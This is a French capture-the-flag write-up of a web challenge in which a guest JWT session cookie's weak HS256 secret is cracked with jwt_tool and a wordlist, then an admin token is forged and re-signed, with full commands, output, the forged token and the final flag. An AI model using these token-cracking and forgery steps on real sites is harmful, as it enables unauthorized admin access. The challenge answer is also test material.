# Web : Un site peut en cacher un autre 2/2
**Challenge Author(s)**: SevenInside
**Difficulty**: Moyen

## Synopsis

Une page d'administration semble cacher un secret !

## Steps to solve

Le cookie de session `halloween-usertype` semble stocker un jeton JWT : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QifQ.KoIsL-7JOMQNlJNlCIFw7-FL0iWsFKw_3tN9lX-54rk`. A travers du site <jwt.io>, on remarque que le jeton stocke le rôle de l'utilisateur à savoir `guest`. Il est donc nécessaire de voir comment casser ce token JWT. Il repose sur un mot de passe (l'algorithme utilisé est `HS256` aka HMAC with SHA-256)

Pour ce faire JWT_Tool permet de brute-forcer le mot de passe signant le jeton.

```bash
admin@HIT2025 jwt_tool % python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QifQ.KoIsL-7JOMQNlJNlCIFw7-FL0iWsFKw_3tN9lX-54rk -C -d rockyou2.txt
        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|       \__| \______/  \______/ \__|
Version 2.3.0                 \______|              @ticarpi
/Users/admin/.jwt_tool/jwtconf.ini
Original JWT:
[+] bad is the CORRECT key!
```

Il est maintenant nécessaire de modifier le token JWT pour indiquer `admin` au lieu de `guest`, puis de resigner le nouveau jeton avec la clé `bad`.

```bash
admin@l-mac-elodie jwt_tool % python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QifQ.KoIsL-7JOMQNlJNlCIFw7-FL0iWsFKw_3tN9lX-54rk -pc name -pv admin -S hs256 -p "bad" -I
        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|       \__| \______/  \______/ \__|
Version 2.3.0                 \______|              @ticarpi
/Users/admin/.jwt_tool/jwtconf.ini
Original JWT:
jwttool_d281babce988b80fc4e558f023fb1a5c - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4ifQ.g4OQVoTTizkZh43xD_PoEGQDTV6dDm1m-IyuLVI6pEE
```

Une fois réactualisée la page d'administration on obtient le flag final : `hit{dOntUsesimPLeJwTSecrets}`